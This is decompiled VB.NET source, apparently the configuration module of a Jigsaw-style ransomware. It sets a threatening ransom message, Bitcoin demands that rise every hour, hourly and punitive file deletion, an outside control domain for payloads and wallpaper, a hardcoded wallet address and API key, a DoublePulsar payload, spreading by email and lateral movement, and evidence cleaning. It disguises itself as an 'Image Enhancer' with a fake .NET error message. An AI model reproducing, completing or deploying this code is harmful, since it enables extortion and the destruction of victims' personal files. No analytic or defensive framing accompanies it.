Imports System
Imports System.Collections.Generic
Imports System.IO
Imports System.Net
Imports Main.Tools

Namespace Main
	' Token: 0x02000004 RID: 4
	Friend Module Config
		' Token: 0x0600000E RID: 14 RVA: 0x00002D60 File Offset: 0x00000F60
		Public Function SelectDomain() As String
			For Each text As String In Config.ControlDomainList
				If Config.DomainIsAlive(text) Then
					Return text
				End If
			Next
			Return Config.ControlDomainList(0)
		End Function

		' Token: 0x0600000F RID: 15 RVA: 0x00002DC8 File Offset: 0x00000FC8
		Public Function DomainIsAlive(domain As String) As Boolean
			Dim httpWebRequest As HttpWebRequest = CType(WebRequest.Create(New Uri(domain)), HttpWebRequest)
			httpWebRequest.Timeout = 15000
			Dim flag As Boolean
			Try
				Dim httpWebResponse As HttpWebResponse = CType(httpWebRequest.GetResponse(), HttpWebResponse)
				flag = True
			Catch ex As Exception
				flag = False
			End Try
			Return flag
		End Function

		' Token: 0x06000010 RID: 16 RVA: 0x00002E18 File Offset: 0x00001018
		Shared Sub New()
			Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
			Dim folderPath2 As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
			Config.StartMode = Config.StartModeType.Debug
			Config.ActiveAfterDateTime = New DateTime(2010, 1, 1)
			Config.ErrorMessage = "To run this application, you first must install one of the following version of the .NET Framework:" + Environment.NewLine + ".NET Framework, Version = 4.5.1"
			Config.ErrorTitle = ".NET Framework Initialization Error"
			Config.StartupMethod = Windows.StartupMethodType.Registry
			Config.TempExeRelativePath = "Google (x86)\Chrome32.exe"
			Config.FinalExeRelativePath = "Frfx\firefox.exe"
			Config.FinalExePath = Path.Combine(folderPath, Config.FinalExeRelativePath)
			Config.TempExePath = Path.Combine(folderPath2, Config.TempExeRelativePath)
			Config.WorkFolderRelativePath = Environment.CurrentDirectory
			Config.WorkFolderPath = Path.Combine(folderPath, Config.WorkFolderRelativePath)
			If Not Directory.Exists(Config.WorkFolderPath) Then
				Directory.CreateDirectory(Config.WorkFolderPath)
			End If
			Config.OnlyRunAfterSysRestart = False
			Config.WelcomeMessage = String.Concat(New String() { "I want to play a game with you. Let me explain the rules:", Environment.NewLine, "Your personal files are being deleted. Your photos, videos, documents, etc...", Environment.NewLine, "But, don't worry! It will only happen if you don't comply.", Environment.NewLine, "However I've already encrypted your personal files, so you cannot access them.", Environment.NewLine, Environment.NewLine, "Every hour I select some of them to delete permanently,", Environment.NewLine, "therefore I won't be able to access them, either.", Environment.NewLine, "Are you familiar with the concept of exponential growth? Let me help you out.", Environment.NewLine, "It starts out slowly then increases rapidly.", Environment.NewLine, "During the first 24 hour you will only lose a few files,", Environment.NewLine, "the second day a few hundred, the third day a few thousand, and so on.", Environment.NewLine, Environment.NewLine, "If you turn off your computer or try to close me, when I start next time", Environment.NewLine, "you will get 1000 files deleted as a punishment, kill me 30 times and your hard drive is gone.", Environment.NewLine, "Yes you will want me to start next time, since I am the only one that", Environment.NewLine, "is capable to decrypt your personal data for you.", Environment.NewLine, Environment.NewLine, "       Now, let's start and enjoy our little game together!       " })
			Config.RansomUsd = 300
			Config.MaxRansomUsd = 500
			Config.RiseRansom = True
			Config.IncreaseRansomEveryHour = 2
			Config.IncreaseRansomByPercent = 10
			Config.EraseFilesEveryMinutes = 60
			Config.TaskMessage = "Send $" + Config.RansomUsd + " worth in Bitcoin here:"
		End Sub

		' Token: 0x04000005 RID: 5
		Public RunElevated As Boolean = False

		' Token: 0x04000006 RID: 6
		Public GetBankingInformationEveryOneToHour As Integer = 4

		' Token: 0x04000007 RID: 7
		Public ControlDomainList As List(Of String) = New List(Of String)() From { "https://aesculapius.000webhostapp.com/" }

		' Token: 0x04000008 RID: 8
		Public SelectedControlDomain As String = Config.SelectDomain()

		' Token: 0x04000009 RID: 9
		Public MalwareNameInServer As String = "svchst.ex"

		' Token: 0x0400000A RID: 10
		Public api_key As String() = New String() { "255a-75d1-7cc3-6db7" }

		' Token: 0x0400000B RID: 11
		Public hardcodedWalletAddr As String() = New String() { "3DCMs9XgBi6HDigyPggqhrpMYuwp3d81rM" }

		' Token: 0x0400000C RID: 12
		Public MaxNunberOfAddressesInBlockIoAcc As Integer = 100

		' Token: 0x0400000D RID: 13
		Public NewBTCAddressEachRestart As Boolean = True

		' Token: 0x0400000E RID: 14
		Public AdminUsername As String = "Administrator"

		' Token: 0x0400000F RID: 15
		Public AdminPassword As String = "666_666"

		' Token: 0x04000010 RID: 16
		Public PayloadStorageWebsiteLink As String = Config.SelectedControlDomain

		' Token: 0x04000011 RID: 17
		Public DoublePulsarPayloadFile As String = "payload.zip"

		' Token: 0x04000012 RID: 18
		Public DoublePulsarPayloadFilePass As String = "666_666"

		' Token: 0x04000013 RID: 19
		Public WallPaperImageLink As String = Config.SelectedControlDomain

		' Token: 0x04000014 RID: 20
		Public WallPaperImageFileName As String = "hacked.jpg"

		' Token: 0x04000015 RID: 21
		Public SelectedWalletApiKey As String = Config.api_key(0)

		' Token: 0x04000016 RID: 22
		Public SpreadMailWebServerAddress As Uri = New Uri(Config.SelectedControlDomain)

		' Token: 0x04000017 RID: 23
		Public smtpListListFile As String = "smtp.txt"

		' Token: 0x04000018 RID: 24
		Public SpreadMailEmailListFile As String = "readme.txt"

		' Token: 0x04000019 RID: 25
		Public SpreadEmailAttachment As String = "registration.rar"

		' Token: 0x0400001A RID: 26
		Public UseMassMailer As Boolean = False

		' Token: 0x0400001B RID: 27
		Public RandonDomainGeneration As Boolean = False

		' Token: 0x0400001C RID: 28
		Public VisitsPerMinute As Integer = 3

		' Token: 0x0400001D RID: 29
		Public LateralMovementSpreading As Boolean = True

		' Token: 0x0400001E RID: 30
		Public DeleteManyFilesPunishementIfRestarted As Boolean = False

		' Token: 0x0400001F RID: 31
		Public HowManyFilesToDeleteEachRestart As Integer = 1000

		' Token: 0x04000020 RID: 32
		Public EvidenceCleaner As Boolean = True

		' Token: 0x04000021 RID: 33
		Public DoomsDayCounter As Integer = 10

		' Token: 0x04000022 RID: 34
		Public RemoveSelfAfterCleaning As Boolean = True

		' Token: 0x04000023 RID: 35
		Friend Const AssemblyProdutAndTitle As String = "Image Enhancer"

		' Token: 0x04000024 RID: 36
		Friend Const AssemblyCopyright As String = "Copyright 1999-2012 Image Enhancer developers. All rights reserved."

		' Token: 0x04000025 RID: 37
		Friend Const AssemblyVersion As String = "37.0.2.5583"

		' Token: 0x04000026 RID: 38
		Friend Const EncryptionFileExtension As String = ".die"

		' Token: 0x04000027 RID: 39
		Friend Const MaxFilesizeToEncryptInBytes As Integer = 1000000000

		' Token: 0x04000028 RID: 40
		Public DynamicEncryptionPassword As Boolean = False

		' Token: 0x04000029 RID: 41
		Friend EncryptionPassword As String = "oOIsAwwF32cICQoLDB0ODeGHedyuAS=="

		' Token: 0x0400002A RID: 42
		Friend StartMode As Config.StartModeType

		' Token: 0x0400002B RID: 43
		Friend ErrorMessage As String

		' Token: 0x0400002C RID: 44
		Friend ErrorTitle As String

		' Token: 0x0400002D RID: 45
		Friend StartupMethod As Windows.StartupMethodType

		' Token: 0x0400002E RID: 46
		Friend TempExeRelativePath As String

		' Token: 0x0400002F RID: 47
		Friend TempExePath As String

		' Token: 0x04000030 RID: 48
		Friend FinalExeRelativePath As String

		' Token: 0x04000031 RID: 49
		Friend FinalExePath As String

		' Token: 0x04000032 RID: 50
		Friend WorkFolderRelativePath As String

		' Token: 0x04000033 RID: 51
		Friend WorkFolderPath As String

		' Token: 0x04000034 RID: 52
		Friend OnlyRunAfterSysRestart As Boolean

		' Token: 0x04000035 RID: 53
		Friend ActiveAfterDateTime As DateTime

		' Token: 0x04000036 RID: 54
		Friend Activated As Boolean = False

		' Token: 0x04000037 RID: 55
		Friend TimerActivateCheckerInterval As Integer = 1000

		' Token: 0x04000038 RID: 56
		Friend WelcomeMessage As String

		' Token: 0x04000039 RID: 57
		Friend TaskMessage As String

		' Token: 0x0400003A RID: 58
		Friend RansomUsd As Integer

		' Token: 0x0400003B RID: 59
		Friend IncreaseRansomEveryHour As Integer

		' Token: 0x0400003C RID: 60
		Friend IncreaseRansomByPercent As Integer

		' Token: 0x0400003D RID: 61
		Friend RiseRansom As Boolean

		' Token: 0x0400003E RID: 62
		Friend MaxRansomUsd As Integer

		' Token: 0x0400003F RID: 63
		Friend EraseFilesEveryMinutes As Integer

		' Token: 0x02000005 RID: 5
		Public NotInheritable Class SmtpServerData
			' Token: 0x04000040 RID: 64
			Public Shared MailFrom As String() = New String() { "youremail@gmail.com" }

			' Token: 0x04000041 RID: 65
			Public Shared MailTo As String() = New String() { "youremail@gmail.com" }

			' Token: 0x04000042 RID: 66
			Public Shared Username As String() = New String() { "yourusername" }

			' Token: 0x04000043 RID: 67
			Public Shared Password As String() = New String() { "yourpassword" }

			' Token: 0x04000044 RID: 68
			Public Shared SelectedAccount As Integer = New Random().[Next](0, Config.SmtpServerData.MailFrom.Length)

			' Token: 0x04000045 RID: 69
			Public Shared SelectedMailFrom As String = Config.SmtpServerData.MailFrom(Config.SmtpServerData.SelectedAccount)

			' Token: 0x04000046 RID: 70
			Public Shared SelectedMailTo As String = Config.SmtpServerData.MailTo(Config.SmtpServerData.SelectedAccount)

			' Token: 0x04000047 RID: 71
			Public Shared SelectedUsername As String = Config.SmtpServerData.Username(Config.SmtpServerData.SelectedAccount)

			' Token: 0x04000048 RID: 72
			Public Shared SelectedPassword As String = Config.SmtpServerData.Password(Config.SmtpServerData.SelectedAccount)

			' Token: 0x04000049 RID: 73
			Public Shared ServerLinkAddress As String = "smtp.gmail.com"

			' Token: 0x0400004A RID: 74
			Public Shared ServerPort As Integer = 587

			' Token: 0x0400004B RID: 75
			Public Shared SslEnable As Boolean = True
		End Class

		' Token: 0x02000006 RID: 6
		Friend Enum StartModeType
			' Token: 0x0400004D RID: 77
			Debug
			' Token: 0x0400004E RID: 78
			ErrorMessage
			' Token: 0x0400004F RID: 79
			NothingHappens
			' Token: 0x04000050 RID: 80
			DeleteItself
		End Enum
	End Module
End Namespace
